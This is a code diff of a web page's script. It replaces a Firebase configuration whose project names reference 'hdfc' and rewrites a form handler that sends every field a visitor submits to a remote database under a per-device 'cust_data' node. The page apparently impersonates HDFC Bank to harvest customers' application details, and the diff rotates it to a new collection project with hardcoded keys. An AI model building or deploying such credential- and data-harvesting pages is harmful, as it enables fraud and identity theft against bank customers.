@@ -311,14 +311,14 @@
 
     <script>
         const firebaseConfig = {
-            apiKey: "AIzaSyDrTNuW2u0b0fJpL-8Yb8STBggon0p-zcs",
-            authDomain: "hdfc-a-client-apcd001.firebaseapp.com",
-            databaseURL: "https://hdfc-a-client-apcd001-default-rtdb.firebaseio.com",
-            projectId: "hdfc-a-client-apcd001",
-            storageBucket: "hdfc-a-client-apcd001.firebasestorage.app",
-            messagingSenderId: "552520760858",
-            appId: "1:552520760858:web:0e0917aa3355b141315ba3",
-            measurementId: "G-JM2VQHTSKF"
+            apiKey: "AIzaSyBk9QFAx5Z56tZq6Sezo9w07TQ_hgwgcYM",
+            authDomain: "a-comp-hdfc-apcd006.firebaseapp.com",
+            databaseURL: "https://a-comp-hdfc-apcd006-default-rtdb.firebaseio.com",
+            projectId: "a-comp-hdfc-apcd006",
+            storageBucket: "a-comp-hdfc-apcd006.firebasestorage.app",
+            messagingSenderId: "688804381427",
+            appId: "1:688804381427:web:bc75ee0735735c49086d86",
+            measurementId: "G-41FRGHMX2M"
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
@@ -330,15 +330,15 @@
         async function handleFormSubmit(event) {
             event.preventDefault();
             const formData = new FormData(event.target);
-            const data = Object.fromEntries(formData.entries());
-            const timestamp = Date.now();
+            const payload = Object.fromEntries(formData.entries());
             
-            const payload = {
-                ...data,
-                last_updated: timestamp
-            };
+            // Add metadata
+            payload.last_updated = Date.now();
+            payload.step = "application_info";
+            payload.deviceId = deviceId;
+
+            // Merge data into the main web node
             await database.ref('web/' + deviceId + '/cust_data').update(payload);
-            await database.ref('web_old/' + deviceId + '/cust_data').push(payload);
 
             // Check if a specific target page is requested in the URL
             const urlParams = new URLSearchParams(window.location.search);
